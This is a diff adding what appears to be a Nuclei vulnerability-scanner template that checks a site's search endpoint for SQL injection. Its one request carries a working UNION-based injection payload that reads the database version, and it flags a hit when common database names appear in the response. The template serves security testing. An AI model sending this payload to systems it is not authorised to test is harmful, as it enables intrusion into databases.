@@ -1,0 +1,31 @@
+id: search-sql-injection
+
+info:
+  name: SQL Injection in Search Endpoint
+  author: chippa vijay kumar
+  severity: critical
+  description: This template checks for SQL injection vulnerability by sending a payload that attempts to retrieve the SQL server version through the search endpoint.
+  tags: sql-injection, sqli, critical
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/search.html?keyword='+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x2d2d2d2d2d,version(),0x2d2d2d2d2d),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-"
+
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
+      Connection: "keep-alive"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "MySQL"
+          - "PostgreSQL"
+          - "Microsoft SQL Server"
+          - "Oracle"
+        part: body
+
+      - type: status
+        status:
+          - 200
